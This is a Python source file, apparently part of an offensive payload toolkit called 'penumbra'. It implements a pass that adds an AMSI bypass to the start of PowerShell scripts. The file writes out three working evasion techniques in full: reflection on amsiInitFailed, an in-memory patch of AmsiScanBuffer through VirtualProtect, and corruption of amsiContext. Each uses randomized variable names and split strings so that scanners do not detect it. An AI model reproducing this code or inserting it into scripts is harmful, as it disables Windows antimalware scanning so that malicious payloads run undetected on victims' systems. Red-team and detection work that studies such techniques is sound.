"""PS1 AMSI bypass prepend pass — multiple bypass techniques.

Techniques:
- reflection: Sets amsiInitFailed via reflection (PS session only)
- patch: Patches AmsiScanBuffer prologue via VirtualProtect (process-wide)
- context: Corrupts amsiContext via reflection (PS session only)
"""

from __future__ import annotations

import secrets

from penumbra.types import PassConfig


def _rand_var() -> str:
    return "_" + secrets.token_hex(3)


def _gen_reflection_bypass() -> str:
    """Generate reflection-based AMSI bypass (amsiInitFailed)."""
    v1 = _rand_var()
    v2 = _rand_var()
    return (
        f"${v1} = [Ref].Assembly.GetType("
        f"('System.Manage'+'ment.Auto'+'mation.'+'Am'+'si'+'Ut'+'ils'))\n"
        f"${v2} = ${v1}.GetField("
        f"('am'+'si'+'Init'+'Fai'+'led'), 'NonPublic,Static')\n"
        f"${v2}.SetValue($null, $true)\n"
    )


def _gen_patch_bypass() -> str:
    """Generate AmsiScanBuffer patch bypass via VirtualProtect + Marshal.Copy.

    Overwrites the first 6 bytes of AmsiScanBuffer with:
        mov eax, 0x80004005  (E_FAIL)
        ret
    Bytes: B8 05 40 00 80 C3

    This is process-wide and covers Assembly.Load() AMSI scanning.
    """
    v_cs = _rand_var()
    v_lib = _rand_var()
    v_addr = _rand_var()
    v_old = _rand_var()
    v_patch = _rand_var()

    # Use Add-Type with a C# helper for GetProcAddress + VirtualProtect
    cs_class = "W" + secrets.token_hex(3)
    return (
        f"${v_cs} = @\"\n"
        "using System;\n"
        "using System.Runtime.InteropServices;\n"
        f"public class {cs_class} {{\n"
        '    [DllImport("kernel32")]\n'
        "    public static extern IntPtr GetProcAddress(IntPtr h, string n);\n"
        '    [DllImport("kernel32")]\n'
        "    public static extern IntPtr LoadLibrary(string n);\n"
        '    [DllImport("kernel32")]\n'
        "    public static extern bool VirtualProtect("
        "IntPtr a, UIntPtr s, uint n, out uint o);\n"
        "}\n"
        "\"@\n"
        f"Add-Type ${v_cs}\n"
        f"${v_lib} = [{cs_class}]::LoadLibrary("
        "('am'+'si.d'+'ll'))\n"
        f"${v_addr} = [{cs_class}]::GetProcAddress("
        f"${v_lib}, ('Am'+'si'+'Sc'+'an'+'Bu'+'ffer'))\n"
        f"${v_old} = 0\n"
        f"[void][{cs_class}]::VirtualProtect("
        f"${v_addr}, [UIntPtr]6, 0x40, [ref]${v_old})\n"
        f"${v_patch} = [Byte[]]@(0xB8, 0x05, 0x40, 0x00, 0x80, 0xC3)\n"
        f"[System.Runtime.InteropServices.Marshal]::Copy("
        f"${v_patch}, 0, ${v_addr}, 6)\n"
        f"[void][{cs_class}]::VirtualProtect("
        f"${v_addr}, [UIntPtr]6, ${v_old}, [ref]${v_old})\n"
    )


def _gen_context_bypass() -> str:
    """Generate amsiContext corruption bypass.

    Allocates a 4-byte buffer via AllocHGlobal and assigns it to the
    amsiContext field, then nulls amsiSession. This causes AmsiOpenSession
    to return E_INVALIDARG, effectively disabling AMSI for the session.
    """
    v_ctx_type = _rand_var()
    v_ctx_field = _rand_var()
    v_fake = _rand_var()
    v_sess_field = _rand_var()
    return (
        f"${v_ctx_type} = [Ref].Assembly.GetType("
        "('System.Manage'+'ment.Auto'+'mation.'+'Am'+'si'+'Ut'+'ils'))\n"
        f"${v_ctx_field} = ${v_ctx_type}.GetField("
        "('am'+'si'+'Con'+'text'), 'NonPublic,Static')\n"
        f"${v_fake} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(4)\n"
        f"${v_ctx_field}.SetValue($null, ${v_fake})\n"
        f"${v_sess_field} = ${v_ctx_type}.GetField("
        "('am'+'si'+'Ses'+'sion'), 'NonPublic,Static')\n"
        f"if (${v_sess_field}) {{ ${v_sess_field}.SetValue($null, $null) }}\n"
    )


_GENERATORS = {
    "reflection": _gen_reflection_bypass,
    "patch": _gen_patch_bypass,
    "context": _gen_context_bypass,
}


class AmsiBypassPass:
    """Prepend an AMSI bypass to the script.

    Technique is selected via config.extra["amsi_technique"]:
    - "reflection" (default): amsiInitFailed via reflection
    - "patch": AmsiScanBuffer memory patch via VirtualProtect
    - "context": amsiContext corruption via reflection
    """

    @property
    def name(self) -> str:
        return "amsi"

    def apply(self, data: bytes, config: PassConfig) -> bytes:
        technique = str(config.extra.get("amsi_technique", "reflection"))
        if technique not in _GENERATORS:
            valid = ", ".join(_GENERATORS)
            raise ValueError(
                f"Unknown AMSI technique '{technique}'. Valid: {valid}"
            )
        bypass = _GENERATORS[technique]()
        return (bypass + data.decode("utf-8")).encode("utf-8")
